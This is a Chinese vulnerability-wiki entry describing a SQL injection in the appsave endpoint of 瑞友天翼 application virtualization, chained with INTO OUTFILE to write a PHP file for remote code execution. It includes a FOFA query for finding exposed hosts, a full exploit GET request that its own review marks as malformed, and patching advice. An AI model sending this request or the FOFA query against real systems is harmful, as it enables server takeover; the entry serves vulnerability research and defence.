---
source: "SourByte05/Vulnerability-Wiki-PoC"
title: "瑞友天翼应用虚拟化 appsave SQL注入→outfile写入远程代码执行"
product: "瑞友天翼应用虚拟化"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "<7.0.5.1，声称>=7.0.5.1修复；MySQL写权限/Windows WebRoot/XGI解析"
prerequisites: "无cookie样本但/Admin权限边界未解释"
side_effects: "命令/代码执行示例可能改变主机状态"
review_date: "2026-10-02"
source_url: "https://github.com/SourByte05/Vulnerability-Wiki-PoC"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E8%87%B4%E8%BF%9COA/%E7%91%9E%E5%8F%8B%E5%A4%A9%E7%BF%BC%E5%BA%94%E7%94%A8%E8%99%9A%E6%8B%9F%E5%8C%96%E7%B3%BB%E7%BB%9FSQL%E6%B3%A8%E5%85%A5%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md"
fofa: "app=\"REALOR-天翼应用虚拟化系统\""
id: "vw-df70a2859c264b78b243e8f9"
entity_id: "ve-df70a2859c264b78b243e8f9"
schema_version: "1"
---

# 瑞友天翼应用虚拟化 appsave SQL注入→outfile写入远程代码执行

## 条目说明

- 对象与具体问题：瑞友天翼应用虚拟化；appsave SQL注入→outfile写入RCE
- 版本、配置及部署条件：<7.0.5.1，声称>=7.0.5.1修复；MySQL写权限/Windows WebRoot/XGI解析
- 认证与权限前提：无cookie样本但/Admin权限边界未解释
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 明确错分致远OA，应瑞友天翼虚拟化
- payload unhex参数却包含明文PHP而不是hex，且HTTP目标有未编码空格，示例损坏
- 只写文件不证明XGI一定执行；在野利用无来源，缺厂商公告
- 应核编码原文，不为它补造新利用

## 操作风险

命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 漏洞描述

该漏洞的成功利用可利用SQL注入写入恶意文件获取操作系统权限，最严重的情况下，这可能导致服务器的完全接管，敏感数据泄露，甚至将服务器转化为发起其他攻击的跳板。

影响范围

version < 7.0.5.1

## **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 原文提供部分细节 | 见技术资料 | 未独立核验 | 待来源核实 |

> 归档原表（原作者主张，未独立核验）：上表记录本库当前核验边界；下表保留归档中的公开情况和在野利用声明，不能据此认定本库已验证。
>
> | 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
> |------|-------|-------|------|
> | 是 | 已公开 | 已公开 | 已知 |

### 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 中 |
| 利用难度 | 低 |

## 漏洞复现

FOFA：app="REALOR-天翼应用虚拟化系统"

POC/EXP：

GET /index.php?s=/Admin/appsave&appid=3%27%29%3Bselect+unhex%28%27<?php echo md5("1"); $file = __FILE__; unlink($file);%27%29+into+outfile+%27.%5C%5C..%5C%5C..%5C%5CWebRoot%5C%5Cplom.xgi%27%23 HTTP/1.1
Host: 127.0.0.1:1234

![image-20240508142356016](./.resource/瑞友天翼应用虚拟化系统SQL注入致远程代码执行漏洞/media/image-20240508142356016.png)


![image-20240508142424589](./.resource/瑞友天翼应用虚拟化系统SQL注入致远程代码执行漏洞/media/image-20240508142424589.png)


## 修复方案

加强服务器和应用的访问控制，仅允许可信IP进行访问。另外如非必要，不要将该系统开放在互联网上。

使用WAF等安全设备针对该应用的异常请求进行拦截。

升级修复方案

官方已发布新版本修复漏洞，建议更新至7.0.5.1及以上版本以修复漏洞。


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
